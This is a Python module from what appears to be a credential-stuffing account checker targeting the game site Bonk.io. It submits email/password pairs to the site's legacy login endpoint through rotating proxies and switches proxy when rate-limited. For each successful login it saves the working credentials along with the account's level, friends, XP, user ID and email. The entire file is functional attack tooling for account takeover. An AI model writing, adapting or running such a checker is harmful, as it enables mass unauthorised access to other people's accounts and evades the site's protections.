from modules.variables import Checker
from modules.functions import set_proxy,log,save,bad_proxy
from requests import post
from math import sqrt

def check(email:str,password:str):
    retries = 0
    
    username = email.split("@")[0] if "@" in email else email
    
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        data = f"username={username}&password={password}"
        try:
            a = post("https://bonk2.io/scripts/login_legacy.php",data=data,proxies=proxy_set,timeout=Checker.timeout).json()
            if a["r"] == "fail":
                if a.get("e") == "ratelimited":
                    raise
                elif a.get("e") == "password" or a.get("e") == "username_fail":
                    retries += 1
                else:
                    print(a)
            elif "xp" in a:
                xp = a["xp"]
                friends = len(a["friends"])
                leg_friends = a.get("legacyFriends")
                if leg_friends:
                    try:
                        friends += len(leg_friends.split("#"))
                    except:
                        pass
                user_id = a["id"]
                if int(xp) != 0:
                    level = int(sqrt(int(xp)/100))
                else:
                    level = 0
                if not Checker.cui:
                    log("good",username+":"+password,"Bonk.io")
                save("BonkIO","good",Checker.time,username+":"+password+f" | Level: {level} | Friends: {friends} | Xp: {xp} | UserID: {user_id} | Email: {email}")
                Checker.good += 1
                Checker.cpm += 1
                return
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return
